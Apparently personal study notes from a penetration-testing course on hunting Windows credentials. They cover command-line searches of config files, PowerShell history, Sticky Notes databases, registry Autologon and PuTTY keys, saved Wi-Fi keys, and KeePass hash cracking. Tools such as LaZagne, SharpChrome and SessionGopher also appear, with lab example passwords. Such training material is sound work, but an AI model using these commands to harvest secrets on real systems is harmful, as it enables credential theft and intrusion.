## 1- Credential Hunting
Credentials can unlock many doors for us during our assessments. We may find credentials during our privilege escalation enumeration that can lead directly to local admin access, grant us a foothold into the Active Directory domain environment, or even be used to escalate privileges within the domain. There are many places that we may find credentials on a system, some more obvious than others.
#### Application Configuration Files
##### Searching for Files
Against best practices, applications often store passwords in cleartext config files. Suppose we gain command execution in the context of an unprivileged user account. In that case, we may be able to find credentials for their admin account or another privileged local or domain account. We can use the [findstr](https://ss64.com/nt/findstr.html) utility to search for this sensitive information.
```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```
Sensitive IIS information such as credentials may be stored in a `web.config` file. For the default IIS website, this could be located at `C:\inetpub\wwwroot\web.config`, but there may be multiple versions of this file in different locations, which we can search for recursively.
#### Dictionary Files
##### Chrome Dictionary Files
Another interesting case is dictionary files. For example, sensitive information such as passwords may be entered in an email client or a browser-based application, which underlines any words it doesn't recognize. The user may add these words to their dictionary to avoid the distracting red underline.
```powershell
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```
#### Unattended Installation Files
Unattended installation files may define auto-logon settings or additional accounts to be created as part of the installation. Passwords in the `unattend.xml` are stored in plaintext or base64 encoded.
***Unattend.xml:***
```xml
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="specialize">
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <AutoLogon>
                <Password>
                    <Value>local_4dmin_p@ss</Value>
                    <PlainText>true</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <LogonCount>2</LogonCount>
                <Username>Administrator</Username>
            </AutoLogon>
            <ComputerName>*</ComputerName>
        </component>
    </settings>
```
Although these files should be automatically deleted as part of the installation, sysadmins may have created copies of the file in other folders during the development of the image and answer file.
#### PowerShell History File
Starting with Powershell 5.0 in Windows 10, PowerShell stores command history to the file:
```powershell
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
##### Confirming PowerShell History Save Path
As seen in the (handy) Windows Commands PDF, published by Microsoft [here](https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf), there are many commands which can pass credentials on the command line. We can see in the example below that the user-specified local administrative credentials to query the Application Event Log using [wevutil](https://ss64.com/nt/wevtutil.html).
```powershell
(Get-PSReadLineOption).HistorySavePath
  # C:\Users\htb-student\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
##### Reading PowerShell History File
Once we know the file's location (the default path is above), we can attempt to read its contents using `gc`.
```powershell
gc (Get-PSReadLineOption).HistorySavePath
  # wevtutil qe Application "/q:*[Application [(EventID=3005)]]" /f:text /rd:true /u:WEB02\administrator /p:5erv3rAdmin! /r:WEB02
```

We can also use this one-liner to retrieve the contents of all Powershell history files that we can access as our current user. This can also be extremely helpful as a post-exploitation step. We should always recheck these files once we have local admin if our prior access did not allow us to read the files for some users. This command assumes that the default save path is being used.
```powershell
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```
#### PowerShell Credentials
PowerShell credentials are often used for scripting and automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API), which typically means they can only be decrypted by the same user on the same computer they were created on.

Take, for example, the following script `Connect-VC.ps1`, which a sysadmin has created to connect to a vCenter server easily.
```powershell
# Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword
```
##### Decrypting PowerShell Credentials
If we have gained command execution in the context of this user or can abuse DPAPI, then we can recover the cleartext credentials from `encrypted.xml`. The example below assumes the former.
```powershell
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
  # bob
$credential.GetNetworkCredential().password
  # Str0ng3ncryptedP@ss!
```

---
## 2- Other Files
There are many other types of files that we may find on a local system or on network share drives that may contain credentials or additional information that can be used to escalate privileges. In an Active Directory environment, we can use a tool such as [Snaffler](https://github.com/SnaffCon/Snaffler) to crawl network share drives for interesting file extensions such as `.kdbx`, `.vmdk`, `.vdhx`, `.ppk`, etc. We may find a virtual hard drive that we can mount and extract local administrator password hashes from, an SSH private key that can be used to access other systems, or instances of users storing passwords in Excel/Word Documents, OneNote workbooks, or even the classic `passwords.txt` file. I have performed many penetration tests where a password found on a share drive or local drive led to either initial access or privilege escalation. Many companies provide each employee with a folder on a file share mapped to their user id, i.e., the folder `bjones` on the `users` share on a server called `FILE01` with loose permissions applied (i.e., all Domain Users with read access to all user folders). We often find users saving sensitive personal data in these folders, unaware they are accessible to everyone in the network and not just local to their workstation.
#### Manually Searching the File System for Credentials
We can search the file system or share drive(s) manually using the following commands from [this cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/).
##### Search File Contents for String - Example 1
```cmd
cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt
```
##### Search File Contents for String - Example 2
```powershell
findstr /si password *.xml *.ini *.txt *.config
findstr /SIPN "password" *.txt *.xml *.ini *.config *.log
```
##### Search File Contents for String - Example 3
```cmd
findstr /spin "password" *.*
findstr /S /N /C:"password" C:\* 2>nul
```
##### Search File Contents with PowerShell
```powershell
select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
```
##### Search for File Extensions - Example 1
```cmd
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
```
##### Search for File Extensions - Example 2
```cmd
where /R C:\ *.config
```
##### Search for File Extensions Using PowerShell
Similarly, we can search the file system for certain file extensions with a command such as:
```powershell-session
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```
#### Sticky Notes Passwords
People often use the StickyNotes app on Windows workstations to save passwords and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.
##### Looking for StickyNotes DB Files
```powershell
dir C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
  # plum.sqlite
  # plum.sqlite-shm
  # plum.sqlite-wal
```
We can copy the three `plum.sqlite*` files down to our system and open them with a tool such as [DB Browser for SQLite](https://sqlitebrowser.org/dl/) and view the `Text` column in the `Note` table with the query `select Text from Note;`.
![[Pasted image 20260118213352.png]]
##### Viewing Sticky Notes Data Using PowerShell
This can also be done with PowerShell using the [PSSQLite module](https://github.com/RamblingCookieMonster/PSSQLite). First, import the module, point to a data source (in this case, the SQLite database file used by the StickNotes app), and finally query the `Note` table and look for any interesting data. This can also be done from our attack machine after downloading the `.sqlite` file or remotely via WinRM.
```powershell
Set-ExecutionPolicy Bypass -Scope Process
cd .\PSSQLite\
Import-Module .\PSSQLite.psd1
$db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
  # \id=1a44a631-6fff-4961-a4df-27898e9e1e65 root:Vc3nt3R_adm1n!
```
##### Strings to View DB File Contents
We can also copy them over to our attack box and search through the data using the `strings` command, which may be less efficient depending on the size of the database.
```bash
strings plum.sqlite-wal
```
#### Other Files of Interest
Some other files we may find credentials in include the following:
```shell-session
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```
Some of the privilege escalation enumeration scripts listed earlier in this module search for most, if not all, of the files/extensions mentioned in this section. Nevertheless, we must understand how to search for these manually and not only rely on tools. Furthermore, we may find interesting files that enumeration scripts do not look for and wish to modify the scripts to include them.

---
## 3-Further Credential Theft
There are many other techniques we can use to potentially obtain credentials on a Windows system. This section will not cover every possible scenario, but we will walk through the most common scenarios.
#### Cmdkey Saved Credentials
##### Listing Saved Credentials
The [cmdkey](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) command can be used to create, list, and delete stored usernames and passwords. Users may wish to store credentials for a specific host or use it to store credentials for terminal services connections to connect to a remote host using Remote Desktop without needing to enter a password. This may help us either move laterally to another system with a different user or escalate privileges on the current host to leverage stored credentials for another user.
```powershell
cmdkey /list
  # Target: LegacyGeneric:target=TERMSRV/SQL01 , User: inlanefreight\bob
```
When we attempt to RDP to the host, the saved credentials will be used.
![[Pasted image 20260118224344.png]]
##### Run Commands as Another User
We can also attempt to reuse the credentials using `runas` to send ourselves a reverse shell as that user, run a binary, or launch a PowerShell or CMD console with a command such as:
```powershell
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```
#### Browser Credentials
##### Retrieving Saved Credentials from Chrome
Users often store credentials in their browsers for applications that they frequently visit. We can use a tool such as [SharpChrome](https://github.com/GhostPack/SharpDPAPI) to retrieve cookies and saved logins from Google Chrome.
```powershell
.\SharpChrome.exe logins /unprotect
  # file_path,signon_realm,origin_url,date_created,times_used,username,password
```
>Credential collection from Chromium-based browsers typically generates additional events that could be logged and identified by the blue team such as `4688` (process creation) and `16385` (DPAPI activity); defenders may also consider filesystem/object access events such as `4662` (object access) and `4663` (file access) to improve detection fidelity.
#### Password Managers
Many companies provide password managers to their users. This may be in the form of a desktop application such as `KeePass`, a cloud-based solution such as `1Password`, or an enterprise password vault such as `Thycotic` or `CyberArk`. Gaining access to a password manager, especially one utilized by a member of the IT staff or an entire department, may lead to administrator-level access to high-value targets such as network devices, servers, databases, etc. We may gain access to a password vault through password reuse or guessing a weak/common password.

Some password managers such as `KeePass` are stored locally on the host. If we find a `.kdbx` file on a server, workstation, or file share, we know we are dealing with a `KeePass` database which is often protected by just a master password. If we can download a `.kdbx` file to our attacking host, we can use a tool such as [keepass2john](https://gist.githubusercontent.com/HarmJ0y/116fa1b559372804877e604d7d367bbc/raw/c0c6f45ad89310e61ec0363a69913e966fe17633/keepass2john.py) to extract the password hash and run it through a password cracking tool such as [Hashcat](https://github.com/hashcat) or [John the Ripper](https://github.com/openwall/john).
##### Extracting KeePass Hash
First, we extract the hash in Hashcat format using the `keepass2john.py` script.
```bash
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx 
  # ILFREIGHT_Help_Desk:$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154
```
##### Cracking Hash Offline
We can then feed the hash to Hashcat, specifying [hash mode](https://hashcat.net/wiki/doku.php?id=example_hashes) 13400 for KeePass. If successful, we may gain access to a wealth of credentials that can be used to access other applications/systems or even network devices, servers, databases, etc., if we can gain access to a password database used by IT staff.
```bash
hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```

#### Email
If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user's email for terms such as "pass," "creds," "credentials," etc. using the tool [MailSniper](https://github.com/dafthack/MailSniper).
#### More Fun with Credentials (LaZagne)
When all else fails, we can run the [LaZagne](https://github.com/AlessandroZ/LaZagne) tool in an attempt to retrieve credentials from a wide variety of software. Such software includes web browsers, chat clients, databases, email, memory dumps, various sysadmin tools, and internal password storage mechanisms (i.e., Autologon, Credman, DPAPI, LSA secrets, etc.). The tool can be used to run all modules, specific modules (such as databases), or against a particular piece of software (i.e., OpenVPN). The output can be saved to a standard text file or in JSON format. Let's take it for a spin.
**Viewing LaZagne Help Menu**
```powershell
.\lazagne.exe -h
```
##### Running All LaZagne Modules
As we can see, there are many modules available to us. Running the tool with `all` will search for supported applications and return any discovered cleartext credentials. As we can see from the example below, many applications do not store credentials securely (best never to store credentials, period!). They can easily be retrieved and used to escalate privileges locally, move on to another system, or access sensitive data.
```powershell
.\lazagne.exe all
```
#### Even More Fun with Credentials (SessionGopher)
We can use [SessionGopher](https://github.com/Arvanaghi/SessionGopher) to extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials. The tool is written in PowerShell and searches for and decrypts saved login information for remote access tools. It can be run locally or remotely. It searches the `HKEY_USERS` hive for all users who have logged into a domain-joined (or standalone) host and searches for and decrypts any saved session information it can find. It can also be run to search drives for PuTTY private key files (.ppk), Remote Desktop (.rdp), and RSA (.sdtid) files.
##### Running SessionGopher as Current User
We need local admin access to retrieve stored session information for every user in `HKEY_USERS`, but it is always worth running as our current user to see if we can find any useful credentials.
```powershell
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01
```
#### Clear-Text Password Storage in the Registry
Certain programs and windows configurations can result in clear-text passwords or other data being stored in the registry. While tools such as `Lazagne` and `SessionGopher` are a great way to extract credentials, as penetration testers we should also be familiar and comfortable with enumerating them manually.
##### Windows AutoLogon
The registry keys associated with Autologon can be found under `HKEY_LOCAL_MACHINE` in the following hive, and can be accessed by standard users:
```cmd
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```
The typical configuration of an Autologon account involves the manual setting of the following registry keys:

- `AdminAutoLogon` - Determines whether Autologon is enabled or disabled. A value of "1" means it is enabled.
- `DefaultUserName` - Holds the value of the username of the account that will automatically log on.
- `DefaultPassword` - Holds the value of the password for the user account specified previously.
###### Enumerating Autologon with reg.exe
```powershell
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
  # AutoAdminLogon    REG_SZ    1
  # DefaultUserName    REG_SZ    htb-student
  # DefaultPassword    REG_SZ    HTB_@cademy_stdnt!
```
>If you absolutely must configure Autologon for your windows system, it is recommended to use Autologon.exe from the Sysinternals suite, which will encrypt the password as an LSA secret.
##### Putty
For Putty sessions utilizing a proxy connection, when the session is saved, the credentials are stored in the registry in clear text.
```cmd
Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>
```
Note that the access controls for this specific registry key are tied to the user account that configured and saved the session. Therefore, in order to see it, we would need to be logged in as that user and search the `HKEY_CURRENT_USER` hive. Subsequently, if we had admin privileges, we would be able to find it under the corresponding user's hive in `HKEY_USERS`.
###### Enumerating Sessions and Finding Credentials:
First, we need to enumerate the available saved sessions:
```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
  # HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```
Next, we look at the keys and values of the discovered session "`kali%20ssh`":
```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
  # ProxyUsername    REG_SZ    administrator
  # ProxyPassword    REG_SZ    1_4m_th3_@cademy_4dm1n!
```
In this example, we can imagine the scenario that the IT administrator has configured Putty for a user in their environment, but unfortunately used their admin credentials in the proxy connection. The password could be extracted and potentially reused across the network.

#### Wifi Passwords
##### Viewing Saved Wireless Networks
If we obtain local admin access to a user's workstation with a wireless card, we can list out any wireless networks they have recently connected to.
```powershell
netsh wlan show profile
  #     All User Profile     : ilfreight_corp
```
###### Retrieving Saved Wireless Passwords
Depending on the network configuration, we can retrieve the pre-shared key (`Key Content` below) and potentially access the target network. While rare, we may encounter this during an engagement and use this access to jump onto a separate wireless network and gain access to additional resources.
```powershell
netsh wlan show profile ilfreight_corp key=clear
  #     Key Content            : ILFREIGHTWIFI-CORP123908!
```
